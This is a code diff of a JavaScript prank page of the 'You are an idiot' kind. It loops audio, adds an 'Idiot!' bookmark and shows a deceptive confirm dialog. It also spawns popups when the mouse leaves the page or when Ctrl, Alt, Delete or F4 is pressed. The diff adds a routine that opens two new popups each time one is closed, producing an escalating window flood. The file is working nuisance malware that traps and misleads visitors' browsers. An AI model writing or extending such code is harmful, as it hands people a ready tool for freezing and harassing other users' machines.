@@ -1,7 +1,6 @@
 // Falešný dialog na začátku
 (function() {
     confirm("Opravdu chcete tuto akci vykonat?\nKlikněte na 'OK' pro opušťení, 'Storno' pro pokračování."); 
-    // Nezáleží na tom, co uživatel klikne, pokračujeme dál
 })();
 
 /* [Oct 2021] Added to comply with strict browser policies. */
@@ -21,18 +20,15 @@ function musicPlay() {
     else {
         audio.pause();
         audio.currentTime = 0;
-        
         micon.src = "images/speakerm.png";
     }
     
     document.removeEventListener('click', musicPlay);
 }
 
-var faudio = new Audio('youare.mp3')
+var faudio = new Audio('youare.mp3');
 
 faudio.addEventListener('timeupdate', function() {
-    console.log('TimeUpdate invoked.');
-
     if (this.currentTime > this.duration - .45) {
         this.currentTime = 0;
         this.play();
@@ -45,7 +41,6 @@ function bookmark() {
     if ((navigator.appName == "Microsoft Internet Explorer") && (parseInt(navigator.appVersion) >= 4)) {
         var url = "lol.html";
         var title = "‎‎Idiot!";
-        
         window.external.AddFavorite(url, title);
     }
 }
@@ -60,8 +55,21 @@ function changeTitle(title) {
     document.title = title;
 }
 
+var openWindows = []; // Track all opened popups
+
 function openWindow(url) {
-    aWindow = window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
+    var aWindow = window.open(url, "_blank", "menubar=no,status=no,toolbar=no,resizable=no,width=357,height=330,titlebar=no,alwaysRaised=yes");
+    if (aWindow) {
+        openWindows.push(aWindow);
+        // Check if window is closed, then open 2 more
+        var timer = setInterval(function() {
+            if (aWindow.closed) {
+                clearInterval(timer);
+                openWindows = openWindows.filter(w => !w.closed);
+                for (var i = 0; i < 2; i++) openWindow('lol.html');
+            }
+        }, 500);
+    }
 }
 
 function proCreate() {    
@@ -113,16 +121,13 @@ function playBall() {
 /* [Oct 2021] Better code. */
 window.onload = function () {
     flagRun = 1;
-    
     playBall();
     bookmark(); // Internet Explorer only (what a piece of sugar)
-    
     return true;
 }
 
 window.onmouseout = function () {
     proCreate();
-
     return null;
 };
 
@@ -132,11 +137,9 @@ window.oncontextmenu = function() {
 
 window.onkeydown = function() {    
     var keyCode = event.keyCode;
-    
     if (keyCode == 17 || keyCode == 18 || keyCode == 46 || keyCode == 115) {    
         proCreate();
     }
-    
     return null;
 }
 
